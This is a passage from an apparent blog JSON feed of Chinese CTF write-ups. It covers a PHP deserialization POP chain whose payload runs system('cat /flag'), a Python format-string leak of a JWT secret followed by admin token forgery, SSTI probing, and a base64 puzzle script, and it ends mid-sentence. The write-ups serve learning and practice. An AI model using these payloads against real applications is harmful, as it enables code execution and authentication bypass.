class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'serialize'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre><span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><p>先来了解一些魔术方法：</p>\n<table>\n<thead>\n<tr>\n<th>__construct()</th>\n<th>具有构造函数的类会在每次创建新对象时先调用此方法</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong>__destruct()</strong></td>\n<td>某个对象的所有引用都被删除或者当对象被显式销毁时执行</td>\n</tr>\n<tr>\n<td><strong>__get()</strong></td>\n<td>读取不可访问 &lt;font color='red'&gt; 属性的值 &lt;/font&gt;, <code>__get</code>  会被自动调用</td>\n</tr>\n<tr>\n<td><strong>__call()</strong></td>\n<td>在对象中调用一个不可访问 &lt;font color='red'&gt; 方法 &lt;/font &gt; 时， <code>__call</code>  会自动被调用</td>\n</tr>\n<tr>\n<td><strong>__wakeup()</strong></td>\n<td><code>unserialize()</code>  会检查是否存在一个  <code>__wakeup()</code>  方法。如果存在，则会先调用  <code>__wakeup</code>  方法，预先准备对象需要的资源。</td>\n</tr>\n</tbody>\n</table>\n<p>分析上述代码，得知最终入口为 evil 对象调用的 eval 函数，从而构造传播链</p>\n<blockquote>\n<p>entrance--&gt;springboard--&gt;evil</p>\n</blockquote>\n<p>可以自行给 springboard 类增添构造函数</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">springboard</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$middle</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$x</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t\t<span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">middle</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$x</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__call</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$name</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$arguments</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">middle</span><span class=\"token operator\">-></span><span class=\"token property\">hs</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token variable\">$e</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">evil</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"system('cat /flag');\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token variable\">$s</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">springboard</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$e</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">entrance</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$s</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>得到序列化后的结果 ： <code>O:8:&quot;entrance&quot;:1:&#123;s:5:&quot;start&quot;;O:11:&quot;springboard&quot;:1:&#123;s:6:&quot;middle&quot;;O:4:&quot;evil&quot;:1:&#123;s:3:&quot;end&quot;;s:20:&quot;system('cat /flag');&quot;;&#125;&#125;&#125;</code></p>\n<p>最终取得 flag：</p>\n<p><img data-src=\"https://i.loli.net/2021/09/24/jlzvO5bMwC68ZWr.png\" alt=\"\" /></p>\n<h2 id=\"地狱通信改\"><a class=\"anchor\" href=\"#地狱通信改\">#</a> <strong>地狱通信 — 改</strong></h2>\n<blockquote>\n<p>实际上地狱通信比这个简单，但有时间限制，这题做出来地狱通信也就没有问题了</p>\n</blockquote>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>from flask import Flask<span class=\"token punctuation\">,</span> render_template<span class=\"token punctuation\">,</span> request<span class=\"token punctuation\">,</span> session<span class=\"token punctuation\">,</span> redirect<span class=\"token punctuation\">,</span> make_response</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>from secret import secret<span class=\"token punctuation\">,</span> headers<span class=\"token punctuation\">,</span> User</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>import datetime</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>import jwt</pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>app <span class=\"token operator\">=</span> <span class=\"token function\">Flask</span><span class=\"token punctuation\">(</span>__name__<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>@app<span class=\"token operator\">.</span><span class=\"token function\">route</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/\"</span><span class=\"token punctuation\">,</span> methods<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'GET'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'POST'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>def <span class=\"token function\">index</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token class-name return-type\">f</span> <span class=\"token operator\">=</span> <span class=\"token function\">open</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"app.py\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"r\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    ctx <span class=\"token operator\">=</span> f<span class=\"token operator\">.</span><span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    f<span class=\"token operator\">.</span><span class=\"token function\">close</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    res <span class=\"token operator\">=</span> <span class=\"token function\">make_response</span><span class=\"token punctuation\">(</span>ctx<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    name <span class=\"token operator\">=</span> request<span class=\"token operator\">.</span>args<span class=\"token operator\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'name'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">or</span> <span class=\"token string single-quoted-string\">''</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token string single-quoted-string\">'admin'</span> in name <span class=\"token keyword\">or</span> name <span class=\"token operator\">==</span> <span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token keyword\">return</span> res</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    payload <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token string double-quoted-string\">\"name\"</span><span class=\"token punctuation\">:</span> name<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    token <span class=\"token operator\">=</span> jwt<span class=\"token operator\">.</span><span class=\"token function\">encode</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">,</span> secret<span class=\"token punctuation\">,</span> algorithm<span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'HS256'</span><span class=\"token punctuation\">,</span> headers<span class=\"token operator\">=</span>headers<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    res<span class=\"token operator\">.</span><span class=\"token function\">set_cookie</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'token'</span><span class=\"token punctuation\">,</span> token<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token keyword\">return</span> res</pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>@app<span class=\"token operator\">.</span><span class=\"token function\">route</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/hello'</span><span class=\"token punctuation\">,</span> methods<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'GET'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'POST'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>def <span class=\"token function\">hello</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    <span class=\"token class-name return-type\">token</span> <span class=\"token operator\">=</span> request<span class=\"token operator\">.</span>cookies<span class=\"token operator\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'token'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token keyword\">if</span> not token<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token function\">redirect</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">302</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        name <span class=\"token operator\">=</span> jwt<span class=\"token operator\">.</span><span class=\"token function\">decode</span><span class=\"token punctuation\">(</span>token<span class=\"token punctuation\">,</span> secret<span class=\"token punctuation\">,</span> algorithms<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'HS256'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'name'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    except jwt<span class=\"token operator\">.</span>exceptions<span class=\"token operator\">.</span>InvalidSignatureError <span class=\"token keyword\">as</span> e<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token string double-quoted-string\">\"Invalid token\"</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    <span class=\"token keyword\">if</span> name <span class=\"token operator\">!=</span> <span class=\"token string double-quoted-string\">\"admin\"</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>        user <span class=\"token operator\">=</span> <span class=\"token function\">User</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>        flag <span class=\"token operator\">=</span> request<span class=\"token operator\">.</span>args<span class=\"token operator\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'flag'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">or</span> <span class=\"token string single-quoted-string\">''</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>        message <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"Hello &#123;0&#125;, your flag is\"</span> <span class=\"token operator\">+</span> flag</pre></td></tr><tr><td data-num=\"39\"></td><td><pre>        <span class=\"token keyword\">return</span> message<span class=\"token operator\">.</span><span class=\"token function\">format</span><span class=\"token punctuation\">(</span>user<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token function\">render_template</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'flag.html'</span><span class=\"token punctuation\">,</span> name<span class=\"token operator\">=</span>name<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre></pre></td></tr><tr><td data-num=\"43\"></td><td><pre></pre></td></tr><tr><td data-num=\"44\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string double-quoted-string\">\"__main__\"</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>    app<span class=\"token operator\">.</span><span class=\"token function\">run</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>python 编写网页，主要有两大块，第一个函数会屏蔽传参的 'admin'，并设置 cookie 留给第二个函数使用，第二个函数又只能用 admin 访问 flag.html</p>\n<p>所以有两个思路：1. 绕过第一个 admin 而在第二个中显示，发现用 <code>%00</code>  截断可以显示出用户名为 admin，但不能打开 fllag.html</p>\n<p>&lt;font color='red'&gt;2. 伪造这个 token&lt;/font&gt;</p>\n<p>查询到 python 的 format 函数在网页中有漏洞，参考链接：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc29odS5jb20vYS8yOTYxMjEyNjFfMTIwMDQ1Mzc2\">从两道 CTF 实例看 python 格式化字符串漏洞_format (sohu.com)</span></p>\n<p>可以创建普通用户通过该漏洞，带出构造 token 的 secret 和 headers，从而构造 admin 的 token</p>\n<p><img data-src=\"https://i.loli.net/2021/09/21/FtwkxlYZVJECBbO.png\" alt=\"\" /></p>\n<p><img data-src=\"https://i.loli.net/2021/09/21/ZwS3b2vdgEW7UYe.png\" alt=\"\" /></p>\n<p>用 <code>0.__class__.__init__.__globals__[]</code>  带出 secret 和 headers</p>\n<p><img data-src=\"https://i.loli.net/2021/09/21/XoKOJLFgbtmxW2y.png\" alt=\"\" /></p>\n<p>利用 python 的<strong> pyjwt</strong> 库来伪造 admin 的 token：(但使用时是用 import jwt)</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"name\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'admin'</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>secret <span class=\"token operator\">=</span> <span class=\"token string\">'u_have_kn0w_what_f0rmat_i5'</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>headers <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token string\">'alg'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'HS256'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'typ'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'JWT'</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>token <span class=\"token operator\">=</span> jwt<span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">,</span> secret<span class=\"token punctuation\">,</span> algorithm<span class=\"token operator\">=</span><span class=\"token string\">'HS256'</span><span class=\"token punctuation\">,</span> headers<span class=\"token operator\">=</span>headers<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>token<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>token:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJuYW1lIjoiYWRtaW4ifQ.ONh7uQwunkVjB4_ZwuLNIHBGbciqLAtJxQF81elyqBc</p>\n<p>在 hello 页面发送，得到 flag</p>\n<p><img data-src=\"https://i.loli.net/2021/09/21/b4ztBhd7ov1sQjY.png\" alt=\"\" /></p>\n<h2 id=\"让-我-访-问\"><a class=\"anchor\" href=\"#让-我-访-问\">#</a> <strong>让 我 访 问</strong></h2>\n<p>本题知识点：SSTI</p>\n<p>SSTI 这篇文章写的很好：<span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC85Mzc0NjQzNw==\">CTF | 有关 SSTI 的一切小秘密【Flask SSTI + 姿势集 + Tplmap 大杀器】</span></p>\n<p>在对 post 提交的 username 和 passwd 进行渗透无果后，转到对 register 页面的研究上</p>\n<p>&lt;font color='red'&gt; 对于会自动跳转的页面一定要使用 bp 抓包分析 &lt;/font&gt;</p>\n<p><img data-src=\"https://i.loli.net/2021/09/24/iCDM5RZLwSozUkN.png\" alt=\"\" /></p>\n<p>发现页面跳转是通过 “第三方” 跳转的，更改为 abc，发现 abc 被显示出来，尝试 SSTI 注入</p>\n<p><img data-src=\"https://i.loli.net/2021/09/24/q7cuzknBXM49HNU.png\" alt=\"\" /></p>\n<p><strong>成功发现注入点！</strong></p>\n<p>先获取 object 基本类的子类</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">&lt;</span><span class=\"token operator\">!</span>--swig￼0--<span class=\"token operator\">></span></pre></td></tr></table></figure><p>找到可以利用的 os 类，通常可以找到 <code>&lt;class'os._wrap_close'&gt;</code></p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">&lt;</span><span class=\"token operator\">!</span>--swig￼1--<span class=\"token operator\">></span></pre></td></tr></table></figure><p><img data-src=\"https://i.loli.net/2021/09/24/GosJh6QWPbeVkRf.png\" alt=\"\" /></p>\n<h2 id=\"fake-game\"><a class=\"anchor\" href=\"#fake-game\">#</a> <strong>fake game</strong></h2>\n<p>知识点是 <code>原型链污染</code></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubGVhdmVzb25ncy5jb20vUEVORVRSQVRJT04vamF2YXNjcmlwdC1wcm90b3R5cGUtcG9sbHV0aW9uLWF0dGFjay5odG1sJTIy\">博客</span></p>\n<p>题目思路来源<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1hEU0VDL21vZUNURl8yMDIw\">西电安全协会</span></p>\n",
            "tags": [
                "computer-science",
                "CTF",
                "Reverse",
                "Misc",
                "Web"
            ]
        },
        {
            "id": "https://zephyr-cyber.github.io.git/MiniLCTF_2021%E9%A2%98%E8%A7%A3/",
            "url": "https://zephyr-cyber.github.io.git/MiniLCTF_2021%E9%A2%98%E8%A7%A3/",
            "title": "MiniLCTF_2021题解",
            "date_published": "2021-12-14T03:44:10.088Z",
            "content_html": "<h1 id=\"misc\"><a class=\"anchor\" href=\"#misc\">#</a> MISC</h1>\n<ol>\n<li>\n<h2 id=\"好白给的签到题\"><a class=\"anchor\" href=\"#好白给的签到题\">#</a> 好白给的签到题</h2>\n</li>\n</ol>\n<p>压缩包里的文件有点大。。。50MB。。</p>\n<p>有提示：贝斯小学 (base)，50 ，路易。六十四 (想到 base64)，兔子 (斐波那契)，反着跳 (python 逆过来)，八年。</p>\n<p>经过无数 base64 和反向 base64。</p>\n<p>然后打开 story.txt 看下是 base64 写脚本解</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> base64</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>p<span class=\"token operator\">=</span><span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'story.txt'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>c<span class=\"token operator\">=</span>p<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>strip<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>s<span class=\"token operator\">=</span>c</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>while 1:</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    try:</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        s=base64.b64decode(s)</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        print(s)</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    except:</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        try:</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>            s=base64.b64decode(s[::-1])</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>            print(s)</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        except:</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>            break</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>'''</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>z<span class=\"token operator\">=</span><span class=\"token string\">'9smRjNnSWF2b4dkV6BHbStGdrJVcaZUVxM3VZhlWFJlaO52UHZkMURDZrZFNwFTYXhGbSRHZxM2caVlW5plRidFaX5kcK1WVzhnMVpnWsJFbw1mVyRGbNNEarlFVWpXYThWRjhXSWl1Rwh1VyI0MhxmWGF2ckx2YHRGMWNDayEGWoV0YyFzaWtmWVpFMwZkYsR3aWdXVsZ1QotWWYJ1VSpGZrdFeRZVW0QGbWdXUE10UsdUYHBHbSdEZWpVYatWYXpFShpXWsZVNjBTW6BnRiVlQU1EWaxWTahXbVNHcxEGWaZ0YHZ0VZdkUWdlW41WZohmRhlFZGVmVGpXWop1ahdlWEFGWK1GVzRGMZBjUHJ2U0VVTYJVMSdnRUlFWoJTYSxGbTlXWxQVMjZlVhBHbWlGasRlcWxmVzplVaNDaYJ2V5s2VWpkMW9UNtZFNxsWTUJlaTFnWWd1SGpWVwplRiJlVGp1RW1mUrpVMWlkWFZVakZkY1RWMjdkSqZFSSJTYYxGSjJnSGdFM01WVWh3VN5EdrdlVSZ0VTR2aZdFaXZ1TaVkWHZVbhFGetZFNGxWZo5kRhNnUWN1VkVkWYBnVSFGeFN2VxAjVHRWVZpFcwIFWSREZ0plRNdHetZVYShlYTZkbXdVMwY1U41mVZpFblhGaGplcOZ0U4NnMWhGcsJ1VKRUZ0ZlMVtGeHZlS1UlYT5kVNRnWG1kUKRVWZhXbSpmWsNVeVFjUrZlVXpkQIJ2U0d1T0JFbONnWwYFV1sWYXJkRjhXRHd1a0JTV1Y1aNhmUU1Edax2U3ZlVU9kVUJVYkZVTGRmRlJkUGZVTChkYXZFbSRnVGN1aaxmVyh2MWdlVEJ2caZUYDJ1aXpnSsZlWk52VyxmRXdHdtVFaCh0VW5kbWdkVtVVYWxmV'</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>s<span class=\"token operator\">=</span>base64<span class=\"token punctuation\">.</span>b64decode<span class=\"token punctuation\">(</span>z<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>while 1:</pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    s=base64.b64decode(s)</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    print(s)</pre></td></tr><tr><td data-num=\"23\"></td><td><pre>'''</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>z<span class=\"token operator\">=</span><span class=\"token string\">'==QOwQVVY5kbWdVMwY1Rw1mV3tGVWdlVE5kVsxmThZFbWdlUtJlToh1V4lVMUNnWWZVeKZlYYRmRllXSyQmW4dVWDpkRWFGZV5kVaZkV4NWVZRlRUZ1Vkh0YyplVjFTQ6lFcohlYYRWVNZEZxQ1S4d1VaBXVWhFZW1ESSdUYLplVURlWsZ1VKhlTWZ0VhtmQEpleB5mVXB3RhVnWsVFeRZUV'</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>s<span class=\"token operator\">=</span>base64<span class=\"token punctuation\">.</span>b64decode<span class=\"token punctuation\">(</span>z<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"27\"></td><td><pre>while 1:</pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    s=base64.b64decode(s)</pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    print(s)</pre></td></tr><tr><td data-num=\"30\"></td><td><pre>'''</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>z<span class=\"token operator\">=</span><span class=\"token string\">'mNVRoN2MSBnTqpFaVxWO1I2aCRHWygTMlBjWVFFM4BnYtxmT'</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>s<span class=\"token operator\">=</span>base64<span class=\"token punctuation\">.</span>b64decode<span class=\"token punctuation\">(</span>z<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token keyword\">while</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    s<span class=\"token operator\">=</span>base64<span class=\"token punctuation\">.</span>b64decode<span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token comment\">##MiniLCTF&#123;5o_m@ny_Ra66its!!&#125;</span></pre></td></tr></table></figure><p>txt 里面的 base64 解密后逆过来的 